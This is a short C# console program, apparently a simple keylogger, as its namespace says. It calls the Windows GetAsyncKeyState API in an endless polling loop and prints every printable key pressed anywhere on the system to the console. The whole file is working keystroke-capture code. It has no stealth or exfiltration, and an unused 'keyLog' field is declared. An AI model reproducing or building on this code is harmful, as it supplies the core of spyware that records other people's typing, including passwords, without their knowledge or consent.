using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace keylogger
{
    class Program
    {

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static string keyLog = "";
        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32768)
                    {
                        Console.Write((char)i + " ");
                    }
                }
            }
        }
    }
}
